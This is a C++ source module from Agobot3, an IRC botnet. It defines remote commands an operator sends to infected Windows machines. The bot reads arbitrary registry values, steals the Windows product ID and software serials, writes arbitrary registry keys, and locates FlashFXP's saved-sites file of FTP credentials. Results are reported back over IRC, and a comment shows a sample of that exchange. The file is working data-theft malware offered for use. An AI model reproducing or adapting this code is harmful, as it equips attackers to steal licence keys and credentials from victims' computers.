/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

/*
	!harvest.registry Software\\Microsoft\\Windows\\CurrentVersion ProductId
	!harvest.registry SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration SERIAL 

	finally fixed the space problem but you must use quotes like this. 

	<@ytrewq> !harvest.registry HKEY_CURRENT_USER "Software\Axialis\Internet Access" "ProxyPort"
	<+ya3n2sj> Found registry Info from HKEY_CURRENT_USER: (8333).
*/

#include "main.h"
#include "mainctrl.h"
#ifdef __COMPILE_HARVEST_REGISTRY__
#include "harvest_registry.h"

bool CHarvest_Registry::Init() { return true; }

bool CHarvest_Registry::HandleCommand(CMessage *pMsg) {	
#ifdef _WIN32
	if(!pMsg->sCmd.Compare(m_cmdRegistry.szName)) {
		HKEY hkey=NULL, hkeyroot; DWORD dwSize=128; unsigned char szDataBuf[128];
		CString sRootKey=pMsg->sChatString.Token(1, " ", false);
		CString sKeyPath=pMsg->sChatString.Token(2, " ", true);
		CString sKeyName=pMsg->sChatString.Token(3, " ", true);

		if(!sRootKey.Compare("HKEY_CURRENT_USER")) {
			hkeyroot=HKEY_CURRENT_USER;
		} else if(!sRootKey.Compare("HKEY_LOCAL_MACHINE")) {
			hkeyroot=HKEY_LOCAL_MACHINE;
		} else if(!sRootKey.Compare("HKEY_CURRENT_CONFIG")) {
			hkeyroot=HKEY_CURRENT_CONFIG;
		} else if(!sRootKey.Compare("HKEY_CLASSES_ROOT")) {
			hkeyroot=HKEY_CLASSES_ROOT;
		} else if(!sRootKey.Compare("HKEY_USERS")) {
			hkeyroot=HKEY_USERS;
		} else return false;

		LONG lRet=RegOpenKeyEx(HKEY_CURRENT_USER, sKeyPath.CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, sKeyName.CStr(), NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
			pMsg->pReply->DoReplyF(pMsg, "Found registry Info from %s: (%s).", sRootKey.CStr(), szDataBuf);
		RegCloseKey(hkey); }
#endif // _WIN32

/* 
	your friend need some windows keys and you found that you can't get them cause of your setting in config.  
	This is backup ;) - Glow 
*/

#ifdef _WIN32

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 
	char *os; 
	char os2[140];
	if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==0)
	{	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)			os="95";
		if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)					os="NT"; }
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==10)	os="98";
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==90)	os="ME";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==0)		os="2000";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==1)		os="XP";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==2)		os="2003";
	else																os="???";

	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0]!='\0')
	{	sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion); os=os2; }



	if(!pMsg->sCmd.Compare(m_cmdWindowsKeys.szName)) {
	    HKEY hkey=NULL; DWORD dwSize=128; unsigned char szDataBuf[128];
		dwSize = 128; LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "ProductId", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			pMsg->pReply->DoReplyF(pMsg, "Found Windows %s ID: %s", os, szDataBuf);
		RegCloseKey(hkey); }
#endif // _WIN32

#ifdef _WIN32
	// .registry.set HKEY_LOCAL_MACHINE "Software\Microsoft\Windows\CurrentVersion" "ProductId" "<data>"
	if(!pMsg->sCmd.Compare(m_cmdSetReg.szName)) {
		HKEY hkey, hkeyroot; DWORD dwSize=128; unsigned char szDataBuf[128];
		CString sRootKey=pMsg->sChatString.Token(1, " ", false);
		CString sKeyPath=pMsg->sChatString.Token(2, " ", true);
		CString sKeyName=pMsg->sChatString.Token(3, " ", true);
		CString sKeyData=pMsg->sChatString.Token(4, " ", true);

		if(!sRootKey.Compare("HKEY_CURRENT_USER")) {
			hkeyroot=HKEY_CURRENT_USER;
		} else if(!sRootKey.Compare("HKEY_LOCAL_MACHINE")) {
			hkeyroot=HKEY_LOCAL_MACHINE;
		} else if(!sRootKey.Compare("HKEY_CURRENT_CONFIG")) {
			hkeyroot=HKEY_CURRENT_CONFIG;
		} else if(!sRootKey.Compare("HKEY_CLASSES_ROOT")) {
			hkeyroot=HKEY_CLASSES_ROOT;
		} else if(!sRootKey.Compare("HKEY_USERS")) {
			hkeyroot=HKEY_USERS;
		} else return false;

		RegCreateKeyEx(hkeyroot, sKeyPath.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL); 
		RegSetValueEx(hkey, sKeyName.CStr(), 0, REG_SZ, (LPBYTE)(const char *)sKeyData.CStr(), (DWORD)sKeyData.GetLength()); 
		RegCloseKey(hkey); }
#endif // _WIN32


	/* FlashFXP Sites  */

	if(!pMsg->sCmd.Compare(m_cmdFlashFXP.szName)) {
		HKEY hkey=NULL; DWORD dwSize=128; unsigned char szDataBuf[128];
		dwSize = 128; LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\Applications\\FlashFXP.exe\\shell\\open\\command", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
			char sites[256];
			strcpy(sites,replacestr(reinterpret_cast<char*>(szDataBuf),"FlashFXP.exe %1","sites.dat"));
			if(Exist(sites)) {
				pMsg->pReply->DoReplyF(pMsg, "Found FlashFXP Sites: %s\r\n", sites); }
			RegCloseKey(hkey); }
	}

	return true; }

REGOBJ(CHarvest_Registry, g_pHarvest_Registry, false, 0);
REGCMD(m_cmdRegistry,		"harvest.registry",		false,	g_pHarvest_Registry); 
REGCMD(m_cmdWindowsKeys,	"harvest.windowskeys",					false,	g_pHarvest_Registry);
REGCMD(m_cmdFlashFXP,		"harvest.flashfxp",								false,	g_pHarvest_Registry);
REGCMD(m_cmdSetReg,			"registry.set",									false,	g_pHarvest_Registry);

#endif // __COMPILE_HARVEST_REGISTRY__
